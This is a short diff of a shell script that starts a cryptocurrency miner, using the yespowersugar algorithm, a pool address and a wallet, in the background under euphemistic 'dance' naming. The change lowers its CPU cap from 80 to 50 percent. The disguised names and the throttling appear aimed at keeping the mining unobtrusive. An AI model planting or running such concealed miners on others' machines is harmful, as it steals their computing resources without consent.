@@ -66,7 +66,7 @@ start_dance() {
   # Start the dancing process for the selected port
   nohup ./$lucky_file -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.$dancer --timeout 120 -t $num_cores > dance_$port.log 2>&1 &
   local pid=$!
-  cpulimit -p $pid -l 80 &
+  cpulimit -p $pid -l 50 &
   echo "Dance started with PID: $pid using $num_cores cores with file $lucky_file, IP $ip, and port $port"
 
   # Save PID to a file for later use
